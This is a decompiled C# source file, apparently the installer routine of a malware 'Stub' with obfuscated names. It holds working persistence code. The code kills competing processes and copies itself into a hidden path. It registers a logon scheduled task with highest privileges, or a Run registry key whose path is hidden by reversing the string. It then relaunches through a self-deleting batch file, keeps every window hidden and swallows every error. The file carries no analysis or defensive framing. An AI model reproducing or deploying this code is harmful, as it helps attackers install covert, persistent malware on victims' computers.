using System;
using System.Diagnostics;
using System.IO;
using System.Security.Principal;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.Win32;

namespace Stub
{
	// Token: 0x02000006 RID: 6
	public class Class10
	{
		// Token: 0x06000007 RID: 7 RVA: 0x0000206C File Offset: 0x0000026C
		public static bool smethod_0()
		{
			return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
		}

		// Token: 0x06000008 RID: 8 RVA: 0x00002658 File Offset: 0x00000858
		public static void smethod_1()
		{
			try
			{
				FileInfo fileInfo = new FileInfo(Path.Combine(Environment.ExpandEnvironmentVariables(Program.String_8), Program.String_6));
				string fileName = Process.GetCurrentProcess().MainModule.FileName;
				if (fileName != fileInfo.FullName)
				{
					foreach (Process process in Process.GetProcesses())
					{
						try
						{
							if (process.MainModule.FileName == fileInfo.FullName)
							{
								process.Kill();
							}
						}
						catch
						{
						}
					}
					if (Class10.smethod_0())
					{
						Process.Start(new ProcessStartInfo
						{
							FileName = "cmd",
							Arguments = string.Concat(new string[]
							{
								"/c schtasks /create /f /sc onlogon /rl highest /tn \"",
								Path.GetFileNameWithoutExtension(fileInfo.Name),
								"\" /tr '\"",
								fileInfo.FullName,
								"\"' & exit"
							}),
							WindowStyle = ProcessWindowStyle.Hidden,
							CreateNoWindow = true
						});
					}
					else
					{
						using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(Strings.StrReverse("\\nuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS"), RegistryKeyPermissionCheck.ReadWriteSubTree))
						{
							registryKey.SetValue(Path.GetFileNameWithoutExtension(fileInfo.Name), "\"" + fileInfo.FullName + "\"");
						}
					}
					if (File.Exists(fileInfo.FullName))
					{
						File.Delete(fileInfo.FullName);
						Thread.Sleep(1000);
					}
					Stream stream = new FileStream(fileInfo.FullName, FileMode.CreateNew);
					byte[] array = File.ReadAllBytes(fileName);
					stream.Write(array, 0, array.Length);
					string text = Path.GetTempFileName() + ".bat";
					using (StreamWriter streamWriter = new StreamWriter(text))
					{
						streamWriter.WriteLine("@echo off");
						streamWriter.WriteLine("timeout 3 > NUL");
						streamWriter.WriteLine("START \"\" \"" + fileInfo.FullName + "\"");
						streamWriter.WriteLine("CD " + Path.GetTempPath());
						streamWriter.WriteLine("DEL \"" + Path.GetFileName(text) + "\" /f /q");
					}
					Process.Start(new ProcessStartInfo
					{
						FileName = text,
						CreateNoWindow = true,
						ErrorDialog = false,
						UseShellExecute = false,
						WindowStyle = ProcessWindowStyle.Hidden
					});
					Environment.Exit(0);
				}
			}
			catch (Exception)
			{
			}
		}
	}
}
